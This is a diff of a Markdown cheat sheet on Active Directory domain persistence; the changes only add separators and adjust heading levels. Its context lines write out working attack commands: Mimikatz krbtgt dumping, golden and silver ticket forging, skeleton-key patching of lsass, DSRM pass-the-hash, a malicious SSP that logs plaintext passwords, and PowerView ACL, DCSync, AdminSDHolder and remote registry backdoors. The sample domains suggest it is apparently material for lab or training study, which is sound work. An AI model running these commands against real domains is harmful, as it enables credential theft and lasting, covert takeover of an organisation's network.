@@ -15,6 +15,7 @@
 - [MORE](#more)
 
 ### Get krbtgt Hash
+---
 ```powershell
 # On DC as a DA
 C:> Invoke-Mimikatz -Command '"lsadump:lsa /patch"'
@@ -23,12 +24,14 @@ C:> Invoke-Mimikatz -Command '"lsadump:lsa /patch"'
 C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user_<domain>\krbtgt"'
 ```
 ### Golden Ticket
+---
 ```powershell
 C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<fqdn_domain> 
                                          /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500 
                                          /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 ### Silver Ticket
+---
 ```powershell
 # Get Privileges to access HOST service as Administrator con host
 C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> /target:<host_fqdn> 
@@ -39,6 +42,7 @@ C:> Invoke-Mimikatz -Command '0"kerberos::golden /User:Administrator /domain:<do
     /service:RPCSS /rc4:<host_ntlm_hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
 ```
 ### Skeleton Key
+---
 ```powershell
 # Patch a DC `lsass` process allowing to use any user with single password. DA privileges are required.
 C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <hostname>
@@ -56,6 +60,7 @@ mimikatz # !
 
 ```
 ### DSRM (Directory Services Restore Mode)
+---
 - There is a local admin on every DC called `Administrator` whose passwd is the DSRM passwd
 - Following steps need to be done in a DC session with DA rights
 ```powershell
@@ -74,6 +79,7 @@ C:> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAd
 C:> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain> /user:Administrator /ntlm:<adim_hash> /run:powershell.exe
 ```
 ### SSP (Security Support Provider)
+---
 We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!
 - Inject into `lsass` using Mimikatz
 ```powershell
@@ -89,8 +95,8 @@ C:> Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security
 - All logons on DC logged to `C:\Windows\system32\kiwissp.log`
 
 ### ACL Persistence
-
-##### SDPROP and AdminSDHolder
+---
+#### SDPROP and AdminSDHolder
 
   AdminSDHolder is a special AD container with some "default" security permissions that is used as a template for protected AD accounts and groups (like Domain Admins, Enterprise Admins, etc.) to prevent their accidental and unintended modifications, and to keep them secure.
 Once you have agained Domain Admin privileges, AdminSDHolder container can be abused by backdooring it by giving your user GenericAll privileges, which effectively makes that user a Domain Admin.
@@ -121,12 +127,12 @@ C:> Add-DomainGroupMember -Identity 'Domain Admins' .Members <username> -Verbose
 # Change user password
 C:> Set-DomainUserPassword -Identity <usernname> -AccountPassword (ConvertTo-SecureString "Password@" -AsPlainText -Force) -Verbose
 ```
-##### Domain Root Object ACL
+#### Domain Root Object ACL
 ```powershell
 # Add Full Rights to Domain Root ACL
 C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity <username> -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
-##### DCSync
+#### DCSync
 ```powershell
 # Check if a user has DCSync rights. Gives nothing if no rights 
 C:> Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "<user>"}
@@ -138,7 +144,7 @@ C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -P
 C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
-##### WMI Security Descriptors
+#### WMI Security Descriptors
 
 ```powershell
 # To be able to run WMI commands
@@ -158,7 +164,7 @@ C:> Set-RemotePSRemoting –SamAccountName <username> -ComputerName <hostname_fu
 # Now can run WMI on host
 C:> gwmi -class win32_operatingsystem -ComputerName <host>
 ```
-##### Remote Registry
+#### Remote Registry
 ```powershell
 # Using RACE, with admin privs on remote machine
 C:> Add-RemoteRegBackdoor -ComputerName <hostname> -Trustee <username> -Verbose
